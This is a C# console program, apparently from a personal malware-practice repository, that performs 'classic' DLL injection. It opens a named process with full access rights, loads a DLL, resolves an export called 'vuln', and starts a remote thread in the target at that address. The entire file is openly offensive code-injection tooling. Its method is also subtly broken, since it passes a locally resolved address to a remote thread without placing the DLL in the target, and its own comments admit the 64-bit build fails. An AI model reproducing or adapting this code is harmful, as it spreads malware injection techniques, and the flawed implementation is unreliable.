using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

//32 Bit DLL works when run on 32 bit CPU
//64 Bit doesn't work
//Have to change the DLL to compile to the desired architecture you want


namespace Classic_DLL_Injection
{
    class Program

    {

        [DllImport("kernel32.dll")]
        private static extern IntPtr OpenProcess(
           uint dwDesiredAccess,
           bool bInheritHandle,
           uint dwProcessId);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll")]
        private static extern IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParamter,
            uint dwCreationFlags,
            IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr LoadLibrary(string dllToLoad);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true)]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint WaitForSingleObject(
            IntPtr hHandle,
            uint dwMilliseconds);

        public enum StateEnum
        {
            MEM_COMMIT = 0x1000,
            MEM_RESERVE = 0x2000,
            MEM_FREE = 0x10000
        }

        public enum Protection : uint
        {
            PAGE_READONLY = 0x02,
            PAGE_READWRITE = 0x04,
            PAGE_EXECUTE = 0x10,
            PAGE_EXECUTE_READ = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            PROCESS_ALL_ACCESS = 0x1F0FFF
        }

        static void Main(string[] args)
        {
            Console.WriteLine("Enter your Process Name");
            string val = Console.ReadLine();
            IntPtr hProcess = GetProcess(val);

            string dllname = "C:\\Users\\Duncan\\Documents\\GitHub\\malware\\Dll1\\x64\\Debug\\Dll1.dll";

            Console.WriteLine("Loading DLL");
            IntPtr dll = LoadLibrary(dllname);
            Console.WriteLine("Dll loaded : " + dll);

            IntPtr address = GetProcAddress(dll, "vuln");
            Console.WriteLine("Address retreived : " + address);

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, address, IntPtr.Zero, 0, IntPtr.Zero);
            Console.WriteLine("hThread address: " + hThread);

            if (hThread != IntPtr.Zero)
            {
                Console.WriteLine("Injection Successful");
                uint result = WaitForSingleObject(hThread, 0xFFFFFFFF);
                Console.WriteLine(result);
            }
            else
            {
                Console.WriteLine("Injection failed");
            }

            return;

        }

        static IntPtr GetProcess(string s)
        {
            try
            {
                Process proc = Process.GetProcessesByName(s)[0];
                IntPtr windowHandle = OpenProcess((uint)Protection.PROCESS_ALL_ACCESS, false, (uint)proc.Id);
                return windowHandle;
            }
            catch (IndexOutOfRangeException)
            {
                return GetCurrentProcess();
            }

        }

    }
}

